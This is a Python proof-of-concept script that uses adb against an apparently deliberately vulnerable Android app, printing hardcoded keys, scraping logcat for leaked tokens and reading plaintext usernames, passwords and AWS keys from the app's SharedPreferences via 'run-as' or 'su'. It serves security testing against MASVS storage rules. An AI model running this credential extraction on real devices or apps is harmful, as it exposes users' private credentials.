```python
import subprocess
import time
import threading
import re
import xml.etree.ElementTree as ET

# --- Configuration ---
PACKAGE_NAME = "com.dlh.vulnerapp"
SECRETS_ACTIVITY = f"{PACKAGE_NAME}/com.dlh.vulnerapp.SecretsActivity"
SHARED_PREFS_FILE = "/data/data/{PACKAGE_NAME}/shared_prefs/UserPrefs.xml".format(PACKAGE_NAME=PACKAGE_NAME)

# Hardcoded secrets identified from the source code analysis
HARDCODED_API_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Et9HF98yRYq"
HARDCODED_AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
HARDCODED_AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" # From source code, not explicitly in "Detected Hardcoded Secrets" list

logcat_output = []
logcat_thread = None
stop_logcat_event = threading.Event()

def run_adb_command(command, decode=True, check_error=True):
    """Executes an ADB command and returns its output."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            check=check_error,
            capture_output=True,
            text=decode,
            encoding='utf-8' if decode else None
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error executing ADB command: {e.cmd}")
        print(f"Stdout: {e.stdout}")
        print(f"Stderr: {e.stderr}")
        if check_error:
            raise
        return ""
    except FileNotFoundError:
        print("ADB not found. Please ensure ADB is installed and in your PATH.")
        exit(1)

def start_logcat_listener():
    """Starts a background thread to listen to adb logcat."""
    global logcat_thread
    print("[*] Starting adb logcat listener...")
    # Filter for logs from SecretsActivity and general Android toasts (ActivityManager, WindowManager)
    logcat_cmd = f"adb logcat -s SecretsActivity:D ActivityManager:I WindowManager:I"
    process = subprocess.Popen(
        logcat_cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding='utf-8'
    )
    def _read_logcat():
        for line in iter(process.stdout.readline, ''):
            if stop_logcat_event.is_set():
                break
            logcat_output.append(line.strip())
        process.stdout.close()
        process.wait()

    logcat_thread = threading.Thread(target=_read_logcat)
    logcat_thread.daemon = True
    logcat_thread.start()

def stop_logcat_listener():
    """Stops the background logcat listener."""
    global logcat_thread
    print("[*] Stopping adb logcat listener...")
    stop_logcat_event.set()
    if logcat_thread and logcat_thread.is_alive():
        logcat_thread.join(timeout=5) # Wait for thread to finish
    # Attempt to kill any lingering adb logcat processes
    try:
        # For Linux/macOS
        subprocess.run("pkill -f 'adb logcat'", shell=True, stderr=subprocess.DEVNULL)
    except:
        pass # Ignore errors if pkill isn't available or fails
    print("[*] Logcat listener stopped.")

def main():
    print("--- Android Hardcoded Secrets & Insecure Storage PoC ---")
    print("Target Package: " + PACKAGE_NAME)

    # 1. Announce hardcoded secrets
    print("\n[+] Hardcoded Secrets (Identified from Static Analysis):")
    print(f"    - API Token: {HARDCODED_API_TOKEN}")
    print(f"    - AWS Access Key: {HARDCODED_AWS_ACCESS_KEY}")
    print(f"    - AWS Secret Key: {HARDCODED_AWS_SECRET_KEY}")
    print("\n[!] These secrets are directly present in the app's source code, violating MASVS-STORAGE (V2) principles.")

    # 2. Start logcat to capture runtime leaks
    start_logcat_listener()
    time.sleep(2) # Give logcat some time to start

    # 3. Attempt to launch SecretsActivity to trigger onCreate logging
    print(f"\n[+] Attempting to launch activity: {SECRETS_ACTIVITY}")
    print("[*] (Note: This might fail if the activity is not exported or if device is not rooted and app is not debuggable.)")
    launch_cmd = f"adb shell am start -n {SECRETS_ACTIVITY}"
    run_adb_command(launch_cmd, check_error=False) # Do not check error as it might fail if not exported
    time.sleep(5) # Give activity time to launch and log

    stop_logcat_listener()

    # 4. Verify API Token and potential AWS Secret Key in logcat
    api_token_found_in_log = False
    aws_secret_found_in_log = False
    for line in logcat_output:
        if f"Initialized with API Token: {HARDCODED_API_TOKEN}" in line:
            print(f"\n[+] Logcat Verification: Found API Token on activity initialization: '{HARDCODED_API_TOKEN}'")
            api_token_found_in_log = True
        # Toast messages often appear with tag ActivityManager or WindowManager
        # The specific format might vary, but "Secret Key Used" is a good indicator
        if "Secret Key Used:" in line and HARDCODED_AWS_SECRET_KEY in line:
            print(f"\n[+] Logcat Verification: Found AWS Secret Key in Toast/Log: '{HARDCODED_AWS_SECRET_KEY}'")
            print("[!] This confirms the AWS Secret Key is leaked via a Toast message during successful login.")
            aws_secret_found_in_log = True

    if not api_token_found_in_log:
        print("\n[-] Logcat Verification: API Token not found in logs after activity launch. Activity might not have launched or logs are filtered.")
    if not aws_secret_found_in_log:
        print("\n[-] Logcat Verification: AWS Secret Key not found in logs. This likely means the 'login' action was not performed in the app, which is required to trigger the Toast message.")
        print("    Please manually open the app, navigate to 'SecretsActivity', enter any username/password, and click 'Login' to trigger the Toast and SharedPreferences write.")


    # 5. Read Insecure SharedPreferences
    print(f"\n[+] Attempting to read Insecure SharedPreferences file: {SHARED_PREFS_FILE}")
    print("[*] (This requires the app to have successfully logged in at least once in SecretsActivity for the file to be created. Also, requires a rooted device or a debuggable app.)")

    shared_prefs_content = ""
    # Try 'run-as' command first (works for debuggable apps without root)
    try:
        shared_prefs_content = run_adb_command(f"adb shell run-as {PACKAGE_NAME} cat {SHARED_PREFS_FILE}", check_error=False)
    except Exception as e:
        print(f"[-] 'run-as' failed: {e}. Trying with 'su' (requires root).")
        try:
            # Need to double-quote for the whole command to be run as su
            shared_prefs_content = run_adb_command(f"adb shell 'su -c \"cat {SHARED_PREFS_FILE}\"'", check_error=False)
        except Exception as e_su:
            print(f"[-] 'su' failed: {e_su}. Cannot read SharedPreferences without root access or debuggable app.")

    if shared_prefs_content:
        print("\n[+] Found and extracted SharedPreferences content:")
        print("--- Start SharedPreferences (UserPrefs.xml) ---")
        print(shared_prefs_content)
        print("--- End SharedPreferences (UserPrefs.xml) ---\n")

        try:
            root = ET.fromstring(shared_prefs_content)
            username_elem = root.find("string[@name='username']")
            password_elem = root.find("string[@name='password']")
            aws_key_stored_elem = root.find("string[@name='aws_key']")

            if username_elem is not None and username_elem.text:
                print(f"[+] Extracted Username from SharedPreferences: '{username_elem.text}'")
            if password_elem is not None and password_elem.text:
                print(f"[+] Extracted Password from SharedPreferences: '{password_elem.text}'")
            if aws_key_stored_elem is not None and aws_key_stored_elem.text:
                print(f"[+] Extracted AWS Key from SharedPreferences: '{aws_key_stored_elem.text}'")

            if (username_elem is not None and username_elem.text) or \
               (password_elem is not None and password_elem.text) or \
               (aws_key_stored_elem is not None and aws_key_stored_elem.text):
                print("\n[!] This demonstrates insecure storage of sensitive credentials in plain-text SharedPreferences, violating MASVS-STORAGE (V2).")
            else:
                print("[-] No sensitive data (username, password, aws_key) found in SharedPreferences, or data is empty. Manual login might be required.")

        except ET.ParseError as e:
            print(f"[-] Failed to parse SharedPreferences XML: {e}")
            print("    The file might be empty or corrupted, indicating login was not performed or file is not valid XML.")
    else:
        print("[-] SharedPreferences file not found or could not be read. Please ensure manual login has occurred and device is rooted or app debuggable.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!!!] An unexpected error occurred: {e}")
    finally:
        if logcat_thread and logcat_thread.is_alive():
            stop_logcat_listener()

```